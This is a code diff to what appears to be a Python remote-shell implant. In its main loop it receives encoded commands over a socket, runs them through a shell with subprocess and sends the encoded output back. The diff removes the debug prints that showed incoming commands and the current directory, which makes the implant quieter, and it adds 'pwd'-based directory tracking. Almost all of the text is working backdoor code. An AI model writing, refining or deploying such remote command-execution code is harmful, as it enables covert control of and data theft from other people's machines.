@@ -31,13 +31,12 @@ def main():
     currentDirectory="./"
     while True:
         data1=s.recv(4096)
-        print("Received command is:",data1)
         data=de(data1)
         test=data.decode()
         if test[:2]=='cd':
             try:
                 currentDirectory+=test.split()[1]+"/"
-                print('The current directory is:',currentDirectory)
+                # print('The current directory is:',currentDirectory)
                 mess='Changed Directory~'
                 mess=en(mess)
                 s.send(mess)
@@ -46,7 +45,7 @@ def main():
                 s.send(mess)
         # Executing the output using the subprocess lib
         else:
-            print("Current directory is:",currentDirectory)
+            # print("Current directory is:",currentDirectory)
             try:
                 comm=subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=currentDirectory)
                 res1,res2=comm.communicate()
@@ -54,6 +53,13 @@ def main():
                 # Sending the encoded data over the sockets
                 res=en(res)
                 s.send(res)
+
+                # Simplified the currentDirectory variable
+                comm1=subprocess.Popen('pwd', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=currentDirectory)
+                es1,es2=comm1.communicate()
+                currentDirectory=es1.decode()[:len(es1.decode())-1]+'/'
+                # print('Current dir now:',currentDirectory)
+
             except:
                 res=en("Error...")
                 s.send(res)
